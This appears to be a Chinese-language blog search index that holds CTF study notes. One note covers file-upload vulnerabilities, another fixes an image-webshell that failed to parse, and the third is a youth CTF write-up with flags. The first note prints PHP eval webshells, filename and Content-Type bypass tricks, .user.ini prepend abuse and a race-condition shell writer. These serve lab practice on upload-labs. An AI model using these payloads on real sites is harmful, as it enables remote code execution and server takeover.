<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>【CTF笔记】文件上传漏洞</title>
    <link href="/2025/02/07/%E3%80%90CTF%E7%AC%94%E8%AE%B0%E3%80%91%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/02/07/%E3%80%90CTF%E7%AC%94%E8%AE%B0%E3%80%91%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="一、后门代码"><a href="#一、后门代码" class="headerlink" title="一、后门代码"></a>一、后门代码</h1><h2 id="1、一句话后门"><a href="#1、一句话后门" class="headerlink" title="1、一句话后门"></a>1、一句话后门</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_get</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_request</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_post</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>注意，在PHP中配置 <strong>short_open_tag&#x3D;on</strong> 时，图片中不能含有 <strong>&lt;?</strong> ，有会影响PHP代码的解析，导致图片马解析错误</p><h2 id="2、其他后门代码"><a href="#2、其他后门代码" class="headerlink" title="2、其他后门代码"></a>2、其他后门代码</h2><p>后门代码变形：<a href="https://zhuanlan.zhihu.com/p/476338641">WebShell变形</a><br>哥斯拉WebShell免杀：<a href="https://github.com/Tas9er/ByPassGodzilla/">Github链接</a></p><p>注： <strong>assert()</strong> 函数在高版本好像不能直接用，详见：<a href="https://www.php.net/manual/zh/function.assert.php">PHP手册</a></p><p>二次渲染生成图片马（如upload-labs16关）见：<a href="https://xz.aliyun.com/news/2337">二次渲染</a></p><h1 id="二、WAF绕过"><a href="#二、WAF绕过" class="headerlink" title="二、WAF绕过"></a>二、WAF绕过</h1><h2 id="1、允许的后缀名测试"><a href="#1、允许的后缀名测试" class="headerlink" title="1、允许的后缀名测试"></a>1、允许的后缀名测试</h2><p>使用 <strong>BurpSuite</strong> 中的 <strong>Intruder</strong> 爆破可行的后缀名，包括大小写等</p><p>字典见：<a href="https://github.com/Hel1um17/FuzzDictionary">字典</a></p><h2 id="2、更改数据包内容"><a href="#2、更改数据包内容" class="headerlink" title="2、更改数据包内容"></a>2、更改数据包内容</h2><h3 id="a、Content-Type"><a href="#a、Content-Type" class="headerlink" title="a、Content-Type"></a>a、Content-Type</h3><p>更改Content-Type为图片等，常见的见：<a href="https://developer.mozilla.org/zh-cn/docs/web/http/mime_types/common_types">MIME类型</a></p><h3 id="b、文件头"><a href="#b、文件头" class="headerlink" title="b、文件头"></a>b、文件头</h3><p>更改文件头实现绕过，常用的文件头见：<a href="https://www.cnblogs.com/yuluoxingkong/p/10675521.html">文件头</a></p><h3 id="c、加入特殊字符"><a href="#c、加入特殊字符" class="headerlink" title="c、加入特殊字符"></a>c、加入特殊字符</h3><p>如：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs erlang">空格<br>.<br>::<span class="hljs-string">$d</span>ata<br>//注意，以下两个的区别为get方式会自动解码，而post不会，所以需要自己编码后再发送<br><span class="hljs-comment">%00</span><br><span class="hljs-number">0</span>x00<br><span class="hljs-number">0</span>x0a<br></code></pre></td></tr></table></figure><p>注意，可以使用双写某些字符实现对单次过滤的绕过</p><h3 id="d、更改保存路径"><a href="#d、更改保存路径" class="headerlink" title="d、更改保存路径"></a>d、更改保存路径</h3><p>当可以更改保存名称时，可以更改保存名称为 <strong>WebShell.php&#x2F;.</strong></p><p>当通过数组截取后缀名来判断时，可以使用</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">save_name<span class="hljs-selector-attr">[0]</span>=WebShell.php/<br><span class="hljs-comment">//具体索引由代码审计中来</span><br>save_name<span class="hljs-selector-attr">[2]</span>=png<br></code></pre></td></tr></table></figure><p>原理见：<a href="https://www.cnblogs.com/xingzhuz/p/18628659">upload-labs21</a></p><h3 id="e、其他"><a href="#e、其他" class="headerlink" title="e、其他"></a>e、其他</h3><p>其他中的方法来自小迪师傅，因脑洞太大此处不好描述，</p><p>视频见：<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23">小迪安全</a></p><p>在数据包中增加垃圾数据，在数据包大小超过某一限制时，从而直接放行</p><p>在数据包文件名处更改**filename&#x3D;”WebShell.php”**的形式为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">filename</span>=x.php<br><span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;x.php</span><br><span class="hljs-string">filename=&#x27;x.php</span><br><span class="hljs-string">filename=&quot;</span>a.jpg<span class="hljs-comment">;.php&quot;;</span><br><span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;x.php%00.jpg&quot;</span><br><span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;Content-Disposition: form-data;name=&quot;</span>upload_file<span class="hljs-string">&quot;;x.php</span><br><span class="hljs-string">//先看以哪个为准，之后在为准的那个改为php后缀</span><br><span class="hljs-string">filename=&quot;</span>a.jpg<span class="hljs-string">&quot;;filename=&quot;</span>b.jpg<span class="hljs-string">&quot;;filename=&quot;</span>c.jpg<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><h2 id="3、上传某些配置文件"><a href="#3、上传某些配置文件" class="headerlink" title="3、上传某些配置文件"></a>3、上传某些配置文件</h2><h3 id="a、上传Apache下的-htaccess-文件"><a href="#a、上传Apache下的-htaccess-文件" class="headerlink" title="a、上传Apache下的 .htaccess 文件"></a>a、上传Apache下的 .htaccess 文件</h3><p>上传 <strong>.htaccess</strong> 实现让PHP解析WebShell.png为php文件等操作</p><p><strong>.htaccess</strong> 的内容我就不放了，百度即可（其实我试了半天愣是不行 &#x2F;_ \ ）</p><h3 id="b、-user-ini"><a href="#b、-user-ini" class="headerlink" title="b、.user.ini"></a>b、.user.ini</h3><p>上传 <strong>.user.ini</strong> 文件，其中配置</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">//在前面插入WebShell.png</span><br><span class="hljs-built_in">auto</span>_prepend_file=WebShell.png<br><span class="hljs-comment">//在后面插入WebShell.png</span><br><span class="hljs-built_in">auto</span>_append_file=WebShell.png<br></code></pre></td></tr></table></figure><p>实现对此目录下的PHP文件，插入到正常PHP文件中并以PHP解析WebShell.png</p><h2 id="4、其他方法"><a href="#4、其他方法" class="headerlink" title="4、其他方法"></a>4、其他方法</h2><h3 id="a、条件竞争"><a href="#a、条件竞争" class="headerlink" title="a、条件竞争"></a>a、条件竞争</h3><p>适用于先上传再判断合规与否的情况<br>一个 <strong>Intruder</strong> 负责发包，使文件上传，另一个 <strong>Intruder</strong> 负责访问，负责访问PHP代码，使其执行将WebShell写到目录中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="b、常见中间件解析漏洞"><a href="#b、常见中间件解析漏洞" class="headerlink" title="b、常见中间件解析漏洞"></a>b、常见中间件解析漏洞</h3><p>Apache换行解析漏洞等，详见：<a href="http://www.xiaodi8.com/?id=141">PDF资料</a></p><h3 id="c、文件包含漏洞"><a href="#c、文件包含漏洞" class="headerlink" title="c、文件包含漏洞"></a>c、文件包含漏洞</h3><p>配合文件包含漏洞，解析图片马</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【图片马的踩坑】PHP报错Unexpected character in input的解决</title>
    <link href="/2025/02/05/%E3%80%90%E5%9B%BE%E7%89%87%E9%A9%AC%E7%9A%84%E8%B8%A9%E5%9D%91%E3%80%91PHP%E6%8A%A5%E9%94%99Unexpected-character-in-input%E7%9A%84%E8%A7%A3%E5%86%B3/"/>
    <url>/2025/02/05/%E3%80%90%E5%9B%BE%E7%89%87%E9%A9%AC%E7%9A%84%E8%B8%A9%E5%9D%91%E3%80%91PHP%E6%8A%A5%E9%94%99Unexpected-character-in-input%E7%9A%84%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>环境：phpstudy搭建的 <strong>Apache2.4.39</strong> + <strong>PHP7.3.4</strong> ，配置文件均为默认</p><p>在upload-labs练习中，传了一个图片马，但是蚁剑死活连不上，PHP还报错说</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Warning:</span> Unexpected character <span class="hljs-keyword">in</span> <span class="hljs-params">input:</span> <span class="hljs-string">&#x27;&#x27; (ASCII=28) state=0 in C:<span class="hljs-char escape_">\U</span>sers<span class="hljs-char escape_">\H</span>el1um17<span class="hljs-char escape_">\C</span>odes<span class="hljs-char escape_">\l</span>ocalhost<span class="hljs-char escape_">\i</span>ndex.php on line 144</span><br><span class="hljs-string">Parse error: in C:<span class="hljs-char escape_">\U</span>sers<span class="hljs-char escape_">\H</span>el1um17<span class="hljs-char escape_">\C</span>odes<span class="hljs-char escape_">\l</span>ocalhost<span class="hljs-char escape_">\i</span>ndex.php on line 144</span><br><span class="hljs-string">//为了方便起见，index.php为我的图片马，此时为后来我自己测试</span><br><span class="hljs-string">//实际情况是，用了auto_prepend_file将图片包含在readme.php中，蚁剑连接readme.php</span><br></code></pre></td></tr></table></figure><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>对比报错的每一行发现发现，每行都含有若干个 <strong>&lt;?</strong><br>将其删去后蚁剑可以正常连接</p><h1 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h1><p>但平时看师傅们的视频也没有说特意将 <strong>&lt;?</strong> 去掉</p><p>只是直接在文件末尾加上了后门代码，也可以连接成功</p><p>有没有懂的师傅可以解答一下？（已解决）</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我后来去Stack Overflow问了<a href="https://stackoverflow.com/questions/79411834/i-cant-connect-my-webshell-in-file-upload-vulnerability">这个问题</a></p><p>C3roe 大佬说在 <strong>php.ini</strong> 中设置了 <strong>short_open_tag&#x3D;On</strong> 时会把 <strong>&lt;?</strong> 当成PHP代码的开头从而开始解析。我将 <strong>short_open_tag</strong> 设置为了 <strong>OFF</strong> 就没有报错了</p><p>不过我那英语可能没表述清楚，让几个人投了不适合回答，我就把问题删了＞﹏＜，不过还是感谢歪果仁</p>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【CTF比赛】2024青少年强网杯WP</title>
    <link href="/2024/11/24/%E3%80%90CTF%E6%AF%94%E8%B5%9B%E3%80%912024%E9%9D%92%E5%B0%91%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFWP/"/>
    <url>/2024/11/24/%E3%80%90CTF%E6%AF%94%E8%B5%9B%E3%80%912024%E9%9D%92%E5%B0%91%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFWP/</url>
    
    <content type="html"><![CDATA[<h1 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h1><p>战队名称：就来看看题<br>战队排名：87</p><h1 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h1><p><img src="/img/%E3%80%90CTF%E6%AF%94%E8%B5%9B%E3%80%912024%E9%9D%92%E5%B0%91%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFWP/%E5%9B%BE%E7%89%871.png" alt="解题情况"></p><h1 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h1><h2 id="1、签到漫画"><a href="#1、签到漫画" class="headerlink" title="1、签到漫画"></a>1、签到漫画</h2><p>操作内容：<br>四个漫画每个翻到最后一页，每页有四分之一的二维码，用ppt（不会用其他软件·＞﹏＜）把图拼一下，使用在线扫描，url后面即为flag</p><p><img src="/img/%E3%80%90CTF%E6%AF%94%E8%B5%9B%E3%80%912024%E9%9D%92%E5%B0%91%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFWP/%E5%9B%BE%E7%89%872.png" alt="拼接好的二维码"></p><p>扫描结果：<br><a href="http://weixin.qq.com/r/4BIrMz7ES2M0rXpQ90fy?flag%7Byouthful_and_upward%7D">http://weixin.qq.com/r/4BIrMz7ES2M0rXpQ90fy?flag{youthful_and_upward}</a></p><p>flag值：<br>flag{youthful_and_upward}</p><h2 id="2、whitepic"><a href="#2、whitepic" class="headerlink" title="2、whitepic"></a>2、whitepic</h2><p>操作内容：<br>使用010editor发现是个gif文件，扔到<a href="https://ezgif.com/maker%EF%BC%88%E8%BF%99%E7%BD%91%E7%AB%99%E8%BF%98%E6%98%AF%E5%9C%A8%E6%96%87%E4%BB%B6%E9%87%8C%E7%9A%84create">https://ezgif.com/maker（这网站还是在文件里的create</a> by找到的）里发现第二张就是flag</p><p><img src="/img/%E3%80%90CTF%E6%AF%94%E8%B5%9B%E3%80%912024%E9%9D%92%E5%B0%91%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFWP/%E5%9B%BE%E7%89%873.png" alt="图片"></p><p>flag值：<br>flag{passion_is_the_greatest_teacher}</p><h2 id="4、问卷"><a href="#4、问卷" class="headerlink" title="4、问卷"></a>4、问卷</h2><p>操作内容：<br>填写完调查问卷即可<a href="https://www.wenjuan.com/s/UZBZJvmmIG/">https://www.wenjuan.com/s/UZBZJvmmIG/</a></p><p>flag值：<br>flag{thank_you_for_your_support}</p><h2 id="5、Classics"><a href="#5、Classics" class="headerlink" title="5、Classics"></a>5、Classics</h2><p>操作内容：<br>下载后发现是CyberChef的样子，使用CyberChef照着那几个编码弄上去，但是改成decode<br>发现不对，改了改rot13的amount，解出来了<br>（本来上午用ciphey就跑出来了，结果上午跑出来了，下午死活卡死，顶不住啊，用CyberChef再弄了一遍＞﹏＜ )</p><p><img src="/img/%E3%80%90CTF%E6%AF%94%E8%B5%9B%E3%80%912024%E9%9D%92%E5%B0%91%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFWP/%E5%9B%BE%E7%89%874.png" alt="CyberChef"></p><p>flag值：<br>flag{2834d185-a1da-4fb1-8bac-59076eb6a634}</p><h2 id="6、AliceAES"><a href="#6、AliceAES" class="headerlink" title="6、AliceAES"></a>6、AliceAES</h2><p>题目翻译：<br>AES 加密示例<br>你是 Alice，你和 Bob共享相同的key和iv值。<br>你的任务是向鲍勃发送一条消息：你好，鲍勃！<br>使用CBC模式的 AES 加密消息，并以HEX格式与 Bob 共享加密结果。</p><p>操作内容：<br>直接用key和vi值，找一个aes加密的网站，加密即可</p><p><img src="/img/%E3%80%90CTF%E6%AF%94%E8%B5%9B%E3%80%912024%E9%9D%92%E5%B0%91%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFWP/%E5%9B%BE%E7%89%875.png" alt="AES"></p><p>flag值：<br>flag{41865c5e-f20f-44b1-85a4-844a4578ead0}</p><h2 id="7、easymath"><a href="#7、easymath" class="headerlink" title="7、easymath"></a>7、easymath</h2><p>操作内容：<br>先枚举一下前几个，发现有规律</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> next_prime<br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    key=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**(l-<span class="hljs-number">1</span>),<span class="hljs-number">2</span>**l):<br>        s=<span class="hljs-built_in">bin</span>(k)[<span class="hljs-number">2</span>:]<br>        <span class="hljs-keyword">if</span>(k%<span class="hljs-number">2</span>==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1111&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;0000&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s):<br>            key+=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当l为<span class="hljs-subst">&#123;l&#125;</span>时，key为<span class="hljs-subst">&#123;key&#125;</span>&quot;</span>)<br><span class="hljs-comment">#输出</span><br><span class="hljs-comment">#当l为1时，key为1</span><br><span class="hljs-comment">#当l为2时，key为1   </span><br><span class="hljs-comment">#当l为3时，key为2   </span><br><span class="hljs-comment">#当l为4时，key为3   </span><br><span class="hljs-comment">#当l为5时，key为7   </span><br><span class="hljs-comment">#当l为6时，key为12  </span><br><span class="hljs-comment">#当l为7时，key为22  </span><br><span class="hljs-comment">#当l为8时，key为40  </span><br><span class="hljs-comment">#当l为9时，key为75  </span><br><span class="hljs-comment">#当l为10时，key为137</span><br><span class="hljs-comment">#当l为11时，key为252</span><br><span class="hljs-comment">#当l为12时，key为463</span><br><span class="hljs-comment">#当l为13时，key为853</span><br><span class="hljs-comment">#当l为14时，key为1568</span><br><span class="hljs-comment">#当l为15时，key为2884</span><br></code></pre></td></tr></table></figure><p>会发现，从第四个开始，四组一循环，第一个为前三个之和减一，第二个为前三项之和加一，第三四项都是前三项之和<br>所以，算一下第l&#x3D;2331时的key值即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> next_prime<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_key</span>(<span class="hljs-params">l</span>):<br>    <span class="hljs-comment"># 初始的前三个key</span><br>    keys = [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>]  <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, l + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>:  <span class="hljs-comment"># 第一组，key = 前3个key之和 - 1</span><br>            new_key = <span class="hljs-built_in">sum</span>(keys[-<span class="hljs-number">3</span>:]) - <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> (i - <span class="hljs-number">1</span>) % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>:  <span class="hljs-comment"># 第二组，key = 前3个key之和 + 1</span><br>            new_key = <span class="hljs-built_in">sum</span>(keys[-<span class="hljs-number">3</span>:]) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 第三组和第四组，key = 前3个key之和</span><br>            new_key = <span class="hljs-built_in">sum</span>(keys[-<span class="hljs-number">3</span>:])<br>        keys.append(new_key)<br>    <span class="hljs-keyword">return</span> keys[-<span class="hljs-number">1</span>]  <span class="hljs-comment"># 返回第l个key</span><br>l = <span class="hljs-number">2331</span><br>key_at_l = calculate_key(l)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;l=<span class="hljs-subst">&#123;l&#125;</span>时的key是: <span class="hljs-subst">&#123;key_at_l&#125;</span>&quot;</span>)<br>n=<span class="hljs-number">739243847275389709472067387827484120222494013590074140985399787562594529286597003777105115865446795908819036678700460141950875653695331369163361757157565377531721748744087900881582744902312177979298217791686598853486325684322963787498115587802274229739619528838187967527241366076438154697056550549800691528794136318856475884632511630403822825738299776018390079577728412776535367041632122565639036104271672497418509514781304810585503673226324238396489752427801699815592314894581630994590796084123504542794857800330419850716997654738103615725794629029775421170515512063019994761051891597378859698320651083189969905297963140966329378723373071590797203169830069428503544761584694131795243115146000564792100471259594488081571644541077283644666700962953460073953965250264401973080467760912924607461783312953419038084626809675807995463244073984979942740289741147504741715039830341488696960977502423702097709564068478477284161645957293908613935974036643029971491102157321238525596348807395784120585247899369773609341654908807803007460425271832839341595078200327677265778582728994058920387721181708105894076110057858324994417035004076234418186156340413169154344814582980205732305163274822509982340820301144418789572738830713925750250925049059</span><br>key=key_at_l<br>p=next_prime(key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---&quot;</span>)<br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---&quot;</span>)<br><span class="hljs-comment"># 直接使用&quot;/&quot;会报错，所以用&quot;//&quot;，再算一下p*q是否等于n</span><br>q=n//p<br><span class="hljs-built_in">print</span>(q)<br><span class="hljs-built_in">print</span>(p*q==n)<br><span class="hljs-comment">#输出</span><br><span class="hljs-comment">#l=2331时的key是: #24440283427735860782323152407294917357529111353275570975703531438440519660225708967888657253644278000783263820558388701592370615088140947096898134081330591301984360290318641970617489021626752360815885812583176251873031239638493762071047588297627032203293985708994218852662838640238623254740905447146670999830187552717802257362427107073858485019955606331947972091793616373347825119600328855885246072890798551616534636247023983959037046475229361825549780845049341719145179099452625523855259198581865855234803188298849910863377098140158406245399677912502444220011884063994451182221171275547685147549629637310805120815512</span><br><span class="hljs-comment">#---</span><br><span class="hljs-comment">#24440283427735860782323152407294917357529111353275570975703531438440519660225708967888657253644278000783263820558388701592370615088140947096898134081330591301984360290318641970617489021626752360815885812583176251873031239638493762071047588297627032203293985708994218852662838640238623254740905447146670999830187552717802257362427107073858485019955606331947972091793616373347825119600328855885246072890798551616534636247023983959037046475229361825549780845049341719145179099452625523855259198581865855234803188298849910863377098140158406245399677912502444220011884063994451182221171275547685147549629637310805120817903</span><br><span class="hljs-comment">#---</span><br><span class="hljs-comment">#30246942489892106712702239024133721453592842183923733460515110118344404699532017493383428137697227815754741688919151294652492006534840589468962295623069884232619077280815851563195685517196295248643553001644121714958636538938848623892827992267767358030468030240236589927767000556188518269847757669474128501561192367465343050094302650720121351543751423298130335191141395620744634566228434135430114855211983270131333333081108536699301711234514426855659414263828163630092200163488598896179597996128556748173083374014319100056717308084410389660477779719495877439609162161870536882293104016630319703274657500915447940613453</span><br><span class="hljs-comment">#True</span><br></code></pre></td></tr></table></figure><p>验证发现就是所求的p，q，之后使用加密原理，算逆元d，以求解flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br>p=<span class="hljs-number">24440283427735860782323152407294917357529111353275570975703531438440519660225708967888657253644278000783263820558388701592370615088140947096898134081330591301984360290318641970617489021626752360815885812583176251873031239638493762071047588297627032203293985708994218852662838640238623254740905447146670999830187552717802257362427107073858485019955606331947972091793616373347825119600328855885246072890798551616534636247023983959037046475229361825549780845049341719145179099452625523855259198581865855234803188298849910863377098140158406245399677912502444220011884063994451182221171275547685147549629637310805120817903</span><br>q=<span class="hljs-number">30246942489892106712702239024133721453592842183923733460515110118344404699532017493383428137697227815754741688919151294652492006534840589468962295623069884232619077280815851563195685517196295248643553001644121714958636538938848623892827992267767358030468030240236589927767000556188518269847757669474128501561192367465343050094302650720121351543751423298130335191141395620744634566228434135430114855211983270131333333081108536699301711234514426855659414263828163630092200163488598896179597996128556748173083374014319100056717308084410389660477779719495877439609162161870536882293104016630319703274657500915447940613453</span><br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-number">229043746793674889024653533006701296308351926745769842802636384094759379740300534278302123222014817911580006421847607123049816103885365851535481716236688330600113899345346872012870482410945158758991441294885546642304012025685141746649427132063040233448959783730507539964445711789203948478927754968414484217451929590364252823034436736148936707526491427134910817676292865910899256335978084133885301776638189969716684447886272526371596438362601308765248327164568010211340540749408337495125393161427493827866434814073414211359223724290251545324578501542643767456072748245099538268121741616645942503700796441269556575769250208333551820150640236503765376932896479238435739865805059908532831741588166990610406781319538995712584992928490839557809170189205452152534029118700150959965267557712569942462430810977059565077290952031751528357957124339169562549386600024298334407498257172578971559253328179357443841427429904013090062097483222125930742322794450873759719977981171221926439985786944884991660612824458339473263174969955453188212116242701330480313264281033623774772556593174438510101491596667187356827935296256470338269472769781778576964130967761897357847487612475534606977433259616857569013270917400687539344772924214733633652812119743</span><br>n = p * q<br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = invert(e, phi_n)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag.decode())<br><span class="hljs-comment">#输出</span><br><span class="hljs-comment">#flag&#123;77310934-21fa-4ee4-a783-dc1865ebab28&#125;</span><br></code></pre></td></tr></table></figure><p>flag值：<br>flag{77310934-21fa-4ee4-a783-dc1865ebab28}</p><h2 id="12、ezGetFlag"><a href="#12、ezGetFlag" class="headerlink" title="12、ezGetFlag"></a>12、ezGetFlag</h2><p>操作内容：<br>多点几次提示要用post<br>于是就听劝，将方法改为post</p><p><img src="/img/%E3%80%90CTF%E6%AF%94%E8%B5%9B%E3%80%912024%E9%9D%92%E5%B0%91%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFWP/%E5%9B%BE%E7%89%876.png"></p><p>flag值：<br>flag{1aae46ab-3407-469f-955a-f3729a8e13ff}</p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>虽然说成绩只是87名，后来公众号公布的76名，但是对于初出茅庐的我来说已经很高兴了，希望以后能在CTF的路上走的更远<br>加油！<br>d&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)b</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
